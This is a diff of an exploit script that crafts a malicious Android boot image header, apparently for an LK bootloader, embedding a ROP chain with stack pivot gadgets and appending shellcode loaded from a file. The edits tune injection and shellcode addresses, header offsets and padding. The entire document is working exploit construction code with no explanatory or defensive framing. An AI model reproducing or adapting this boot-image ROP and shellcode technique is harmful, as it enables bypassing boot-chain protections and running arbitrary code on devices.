@@ -27,10 +27,10 @@ invalid = base + 0x3fbb0
 
 forced_addr = 0x45000000 
 #inject_addr = base + 0x5C000
-inject_addr = forced_addr + 0x10
+inject_addr = forced_addr + 0x10 + 0x1000000
 inject_sz = 0x1000
 
-shellcode_addr = forced_addr + 0x100
+shellcode_addr = forced_addr + 0x100 + 0x1000000
 #shellcode_sz = 0x200 # TODO: check size
 shellcode_sz = 0x1000 # TODO: check size
 
@@ -48,11 +48,15 @@ def main():
 
     hdr = bytes.fromhex("414E44524F494421")
     #hdr += struct.pack("<II", 0x6D003C8, forced_addr)
-    hdr += struct.pack("<II", 0x6D003C8, forced_addr)
+    #hdr += struct.pack("<II", 0x6D003C8, forced_addr)
+    #hdr += struct.pack("<II", 0x6D002C8, forced_addr)
+    #hdr += struct.pack("<II", 0x6D00390, forced_addr)
+    hdr += struct.pack("<II", 0x6D00384, forced_addr)
     hdr += bytes.fromhex("0000000000000044000000000000F0400000004840000000000000002311040E00000000000000000000000000000000")
     hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
     hdr += b"\x00" * 0xA
     #hdr += b"\x00" * 0x10
+    hdr += b"\x00" * 0x1000000
     hdr += struct.pack("<II", inject_addr + 0x40, pivot) # r3, pc (+0x40 because gadget arg points at the end of ldm package)
     hdr += b"\x00" * 0x1C
     hdr += struct.pack("<III", inject_addr + 0x50, 0, pop_pc) # sp, lr, pc
@@ -81,8 +85,9 @@ def main():
     chain_bin = b"".join([struct.pack("<I", word) for word in chain])
     hdr += chain_bin
 
-    want_len = shellcode_addr - inject_addr + 0x40 + 0x10
-    hdr += b"\x00" * (want_len - len(hdr))
+    want_len = shellcode_addr - inject_addr + 0x40 + 0x10 
+    #hdr += b"\x00" * (want_len - len(hdr))
+    hdr += b"\x00" * 0x68
 
     with open(sys.argv[2], "rb") as fin:
         shellcode = fin.read()
